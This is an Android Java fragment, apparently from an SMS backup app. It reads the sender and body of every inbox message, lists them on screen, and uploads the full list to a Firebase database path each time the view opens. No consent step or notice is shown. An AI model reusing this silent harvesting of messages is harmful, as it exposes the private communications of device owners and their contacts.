package com.example.naveed.backup;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.support.annotation.NonNull;
import android.support.v4.app.Fragment;
import android.support.v7.widget.LinearLayoutManager;
import android.support.v7.widget.RecyclerView;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import net.idik.lib.slimadapter.SlimAdapter;
import net.idik.lib.slimadapter.SlimInjector;
import net.idik.lib.slimadapter.viewinjector.IViewInjector;

import java.util.ArrayList;
import java.util.List;

public class msgFragment extends Fragment {

    RecyclerView recyclerView;
    SlimAdapter slimAdapter;
    List<String> arrayList = new ArrayList<>();

    public msgFragment() {
        // Required empty public constructor
    }

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

    }

    @Override
    public View onCreateView(LayoutInflater inflater, ViewGroup container,
                             Bundle savedInstanceState) {
        // Inflate the layout for this fragment
        View view = inflater.inflate(R.layout.fragment_msg, container, false);
        arrayList = getSMS();
        recyclerView = view.findViewById(R.id.recycler_view);
        recyclerView.removeAllViews();
        LinearLayoutManager Layout = new LinearLayoutManager(getActivity());
        recyclerView.setHasFixedSize(true);
        recyclerView.setLayoutManager(Layout);

        slimAdapter = SlimAdapter.create()
                .register(R.layout.card_view_list, new SlimInjector<String>() {
                    @Override
                    public void onInject(@NonNull final String data, @NonNull final IViewInjector injector) {

                        injector.text(R.id.product_name, data.toUpperCase().toString() + "");
                    }
                })

                .attachTo(recyclerView).updateData(arrayList);
        final FirebaseDatabase database = FirebaseDatabase.getInstance();
        DatabaseReference ref = database.getReference("/data");
        DatabaseReference postsRef = ref.child("sms");

        DatabaseReference newPostRef = postsRef.push();
        newPostRef.setValue(arrayList);

//        DatabaseReference rootRef = FirebaseDatabase.getInstance().getReference();
//        for (String smsList : arrayList) {
//            rootRef.child("Sms Messages").child(smsList).setValue("true ");
//        }

        return view;
    }

    public List<String> getSMS() {
        List<String> sms = new ArrayList<String>();
        Uri uriSMSURI = Uri.parse("content://sms/inbox");
        Cursor cur = getActivity().getContentResolver().query(uriSMSURI, null, null, null, null);

        while (cur != null && cur.moveToNext()) {
            String address = cur.getString(cur.getColumnIndex("address"));
            String body = cur.getString(cur.getColumnIndexOrThrow("body"));
            sms.add("Numberis  " + address.replace(".", " ").replace("'", " ").replace("#", " ").replace("*", " ").replace("@", " ") + "  Messageis  " + body.replace(".", " ").replace("#", " ").replace("'", " ").replace("*", " ").replace("@", " ").replace("/", " ").replace("-", " ").replace("<", " ").replace("[", " ").replace("]", " ").replace("%", " ").replace("$", " ").replace("&", " ").replace(",", " "));
        }

        if (cur != null) {
            cur.close();
        }
        return sms;
    }

    @Override
    public void onAttach(Context context) {
        super.onAttach(context);

    }

    @Override
    public void onDetach() {
        super.onDetach();

    }

}
